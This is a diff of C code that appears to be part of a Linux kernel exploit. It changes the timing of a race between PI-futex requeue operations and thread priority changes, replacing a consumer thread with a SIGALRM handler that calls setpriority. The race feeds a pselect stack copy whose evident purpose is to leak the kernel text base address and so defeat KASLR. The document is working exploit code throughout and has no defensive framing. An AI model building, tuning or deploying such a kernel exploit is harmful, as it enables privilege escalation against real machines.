@@ -1,8 +1,6 @@
 #include "common.h"
 
 #define SLIDE_MAX_ATTEMPTS 40
-#define SLIDE_CONSUME_DELAY 2000
-#define SLIDE_CONSUME_USEC 0
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_PSELECT_WORD_SHIFT_BASE 0
@@ -16,15 +14,7 @@ static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
-static atomic_int slide_consume_calls;
-static atomic_int slide_consume_go;
-static atomic_int slide_consume_seen;
-static atomic_int slide_consume_lost;
-static atomic_int slide_consume_enter_sched;
-static atomic_int slide_consume_stop;
-static atomic_int slide_consume_sched_ok;
-static atomic_int slide_consume_last_sched_ret;
-static atomic_int slide_consume_last_sched_errno;
+
 
 static int slide_word_shift;
 
@@ -171,35 +161,17 @@ void slide_pselect_stack_copy(void) {
   prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
-  atomic_store(&slide_consume_stop, 0);
-  atomic_store(&slide_consume_go, 0);
-  atomic_store(&slide_consume_seen, 0);
-  atomic_store(&slide_consume_lost, 0);
-  atomic_store(&slide_consume_enter_sched, 0);
-  atomic_store(&slide_consume_calls, 0);
-  atomic_store(&slide_consume_sched_ok, 0);
-  atomic_store(&slide_consume_last_sched_ret, -1);
-  atomic_store(&slide_consume_last_sched_errno, 0);
-
   struct timespec timeout = {
     .tv_sec = PSELECT_TIMEOUT_SEC,
     .tv_nsec = 0,
   };
   struct timespec *timeoutp = &timeout;
 
-  atomic_store(&slide_consume_go, 1);
   errno = 0;
-
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
-  atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d shift=%d\n",
-          ret, saved_errno, atomic_load(&slide_consume_calls),
-          atomic_load(&slide_consume_sched_ok),
-          atomic_load(&slide_consume_last_sched_ret),
-          atomic_load(&slide_consume_last_sched_errno),
-          slide_word_shift);
+  pr_info("slide pselect returned ret=%d errno=%d shift=%d\n",
+          ret, saved_errno, slide_word_shift);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -209,84 +181,24 @@ void slide_pselect_stack_copy(void) {
   close(pipefd[1]);
 }
 
-static long try_set_nice(int tid, int nice) {
-  struct local_sched_attr attr;
-  memset(&attr, 0, sizeof(attr));
-  attr.size = sizeof(attr);
-
-  attr.sched_policy = SCHED_BATCH;
-  attr.sched_nice = nice;
-  long ret = syscall(SYS_sched_setattr, tid, &attr, 0);
-  if (ret == 0) return 0;
-
-  attr.sched_policy = SCHED_OTHER;
-  attr.sched_nice = nice;
-  ret = syscall(SYS_sched_setattr, tid, &attr, 0);
-  if (ret == 0) return 0;
-
-  ret = syscall(SYS_setpriority, PRIO_PROCESS, tid, nice);
-  return ret;
-}
-
-void *slide_consumer_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
-
-  int seen = 0;
-  for (;;) {
-    int seq = atomic_load(&slide_consume_go);
-    if (seq == 0 || seq == seen) {
-      __asm__ volatile("yield" ::: "memory");
-      if (atomic_load(&slide_consume_stop)) {
-        return NULL;
-      }
-      continue;
-    }
-
-    seen = seq;
-    atomic_store(&slide_consume_seen, seen);
-    if (SLIDE_CONSUME_USEC) {
-      usleep(SLIDE_CONSUME_USEC);
-    } else {
-      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
-        __asm__ volatile("yield" ::: "memory");
-      }
-    }
-    if (atomic_load(&slide_consume_go) != seq) {
-      int lost = atomic_load(&slide_consume_lost) + 1;
-      atomic_store(&slide_consume_lost, lost);
-      continue;
-    }
-
-    if (seq == 1) {
-      usleep(PSELECT_ENTER_DELAY_USEC);
-    }
-
-    int tid = atomic_load(&slide_waiter_tid);
-    int calls = atomic_load(&slide_consume_calls);
-    int entered = atomic_load(&slide_consume_enter_sched) + 1;
-    atomic_store(&slide_consume_enter_sched, entered);
-    atomic_store(&slide_consume_calls, calls + 1);
-    errno = 0;
-    long ret = try_set_nice(tid, (calls % 19) + 1);
-    int saved_errno = errno;
-    atomic_store(&slide_consume_last_sched_ret, (int)ret);
-    atomic_store(&slide_consume_last_sched_errno, saved_errno);
-    if (ret == 0) {
-      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
-      atomic_store(&slide_consume_sched_ok, sched_ok);
-    }
-    atomic_store(&slide_consume_stop, 1);
-    while (atomic_load(&slide_consume_go)) {
-      __asm__ volatile("yield" ::: "memory");
-    }
-    return NULL;
-  }
+static void slide_alarm_handler(int sig __attribute__((unused))) {
+  syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
 }
 
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
+
+  struct sigaction sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sa_handler = slide_alarm_handler;
+  sigemptyset(&sa.sa_mask);
+  sigaction(SIGALRM, &sa, NULL);
+
+  sigset_t unblock;
+  sigemptyset(&unblock);
+  sigaddset(&unblock, SIGALRM);
+  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);
 
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter lock chain errno=%d\n", errno);
@@ -306,6 +218,8 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
            &slide_f_pi_target, 0);
   futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+
+  signal(SIGALRM, SIG_DFL);
 
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
@@ -403,12 +317,15 @@ uint64_t slide_read_stext(void) {
 }
 
 uint64_t slide_child_leak_stext(void) {
+  sigset_t block;
+  sigemptyset(&block);
+  sigaddset(&block, SIGALRM);
+  pthread_sigmask(SIG_BLOCK, &block, NULL);
+
   pthread_t waiter;
   pthread_t owner;
-  pthread_t consumer;
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
-  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started)) {
@@ -418,6 +335,9 @@ uint64_t slide_child_leak_stext(void) {
   errno = 0;
   futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
            &slide_f_pi_target, 0);
+
+  usleep(50000);
+  pthread_kill(waiter, SIGALRM);
 
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
